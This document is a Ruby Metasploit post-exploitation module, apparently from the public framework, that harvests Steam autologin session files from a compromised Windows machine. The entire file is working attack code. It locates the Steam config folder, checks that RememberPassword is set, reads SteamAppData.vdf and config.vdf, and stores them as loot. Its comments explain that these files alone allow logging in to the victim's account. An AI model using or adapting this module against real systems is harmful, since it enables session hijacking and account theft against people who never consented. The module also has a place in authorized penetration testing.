##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Post

  include Msf::Post::File
  include Msf::Auxiliary::Report

  def initialize(info={})
    super( update_info(info,
      'Name'           => 'Windows Gather Steam Client Session Collector.',
      'Description'    => %q{ This module will collect Steam session information from an
        account set to autologin. },
      'License'        => MSF_LICENSE,
      'Author'         => ['Nikolai Rusakov <nikolai.rusakov[at]gmail.com>'],
      'Platform'       => ['win'],
      'SessionTypes'   => ['meterpreter' ]
    ))
  end

  # All that is needed to login to another Steam account is config.vdf,
  # setting the AutoLoginUser to the proper username and RememberPassword
  # to 1 in SteamAppData.vdf.
  # Only tested on Win7 x64
  #
  # config.vdf , ContentCache element holds a K,V table of what appears
  # to be UniqueID, Session. This is purely speculation as I have not
  # reversed it to check. However the key is always unique to the account
  # and the value changes whenever the account is logged out and then
  # back in.
  def run
    steamappdata = 'SteamAppData.vdf'
    steamconfig = 'config.vdf'
    u_rx = /AutoLoginUser\W*\"(.*)\"/

    # Steam client is only 32 bit so we need to know what arch we are on so that we can use
    # the correct program files folder.
    # We will just use an x64 only defined env variable to check.
    if not expand_path('%ProgramFiles(X86)%').empty? and expand_path('%ProgramFiles(X86)%') !~ /%ProgramFiles\(X86\)%/
      progs = expand_path('%ProgramFiles(X86)%') #x64
    else
      progs = expand_path('%ProgramFiles%') #x86
    end
    path = progs + '\\Steam\\config'

    print_status("Checking for Steam configs in #{path}")

    # Check if all the files are there.
    if directory?(path) && file?("#{path}\\#{steamappdata}") && file?("#{path}\\#{steamconfig}")
      print_status("Located steam config files.")
      sad = read_file("#{path}\\#{steamappdata}")
      if sad =~ /RememberPassword\W*\"1\"/
        print_status("RememberPassword is set! Accountname is #{u_rx.match(sad)[1]}")
        scd = read_file("#{path}\\#{steamconfig}")
        steam_app_data_path = store_loot('steam.config', 'text/plain', session, sad, filename=steamappdata)
        print_good("The file SteamAppData.vdf has been stored on #{steam_app_data_path}")
        steam_config_path = store_loot('steam.config', 'text/plain', session, scd, filename=steamconfig)
        print_good("The file config.vdf has been stored on #{steam_config_path}")
        print_status("Steam configs harvested successfully!")
      else
        print_error("RememberPassword is not set, exiting.")
        return
      end
    else
      print_error("Steam configs not found.")
      return
    end

  end

end
